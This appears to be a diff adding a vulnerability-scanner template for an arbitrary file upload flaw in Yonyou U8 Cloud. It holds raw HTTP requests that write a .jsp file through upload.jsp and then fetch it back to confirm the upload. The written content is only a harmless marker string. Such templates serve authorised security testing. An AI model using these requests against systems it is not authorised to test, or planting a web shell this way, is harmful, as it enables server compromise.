@@ -1,0 +1,33 @@
+id: yonyou-u8-cloud-fileupload
+info:
+  name: yonyou-u8-cloud-fileupload
+  author: apple
+  severity: critical
+  description: 用友U8 Cloud upload任意文件上传,app="用友-U8-Cloud"
+  reference:
+    - https://github.com/wy876/POC/blob/faabd7bb0347e39f3e26e1882c5f0f4699126f7a/%E7%94%A8%E5%8F%8BU8-Cloud%20upload%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md?plain=1#L10
+  tags: yonyou
+http:
+  - raw:
+      - |-
+        POST /linux/pages/upload.jsp HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36
+        Content-Length: 32
+        Content-Type: application/x-www-form-urlencoded
+        Filename: ylraar.jsp
+        Accept-Encoding: gzip, deflate
+        Connection: close
+
+        zwqprmcijdaayvbpbvnlvudtnzrqwyxk
+      - |-
+        GET /linux/ylraar.jsp HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2919.83 Safari/537.36
+        Accept-Encoding: gzip, deflate
+        Connection: close
+    matchers:
+      - type: word
+        part: body
+        words:
+          - zwqprmcijdaayvbpbvnlvudtnzrqwyxk
